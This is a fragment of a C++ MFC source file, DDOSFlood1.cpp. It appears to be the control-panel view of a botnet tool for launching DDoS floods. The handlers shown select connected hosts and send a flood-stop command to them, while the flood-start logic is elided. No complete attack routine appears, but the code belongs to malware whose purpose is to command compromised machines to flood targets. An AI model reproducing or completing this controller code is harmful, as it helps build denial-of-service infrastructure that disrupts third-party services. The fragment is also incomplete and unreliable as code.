// DDOSFlood1.cpp : implementation file
//
...
IMPLEMENT_DYNCREATE(CDDOSFlood1, CFormView)

CDDOSFlood1::CDDOSFlood1()
	: CFormView(CDDOSFlood1::IDD)
{
	//{{AFX_DATA_INIT(CDDOSFlood1)
...
void CDDOSFlood1::DoDataExchange(CDataExchange* pDX)
{
	CFormView::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CDDOSFlood1)
...
BEGIN_MESSAGE_MAP(CDDOSFlood1, CFormView)
	//{{AFX_MSG_MAP(CDDOSFlood1)
...
/////////////////////////////////////////////////////////////////////////////
// CDDOSFlood1 diagnostics

#ifdef _DEBUG
void CDDOSFlood1::AssertValid() const
{
	CFormView::AssertValid();
}

void CDDOSFlood1::Dump(CDumpContext& dc) const
{
	CFormView::Dump(dc);
}
#endif //_DEBUG
...
/////////////////////////////////////////////////////////////////////////////
// CDDOSFlood1 message handlers


void CDDOSFlood1::OnFloodStart() 
{
...
void CDDOSFlood1::OnFloodStop() 
{
	// TODO: Add your control notification handler code here
	g_pConnectView->SendDDostStopCommand("Flood 2");
	GetDlgItem(IDC_COMBO_FLOOD_MODLE)->EnableWindow(TRUE);
}

void CDDOSFlood1::OnInitialUpdate() 
{
...
void CDDOSFlood1::OnSlectAll() 
{
	// TODO: Add your control notification handler code here
	g_pConnectView->SeclectAll();
}

void CDDOSFlood1::OnSlectNow() 
{
	// TODO: Add your control notification handler code here
	g_pConnectView->SeclectNow();
}

void CDDOSFlood1::OnUnslectAll() 
{
	// TODO: Add your control notification handler code here
	g_pConnectView->UnSeclectAll();
}

void CDDOSFlood1::OnUnslectNow() 
{
	// TODO: Add your control notification handler code here
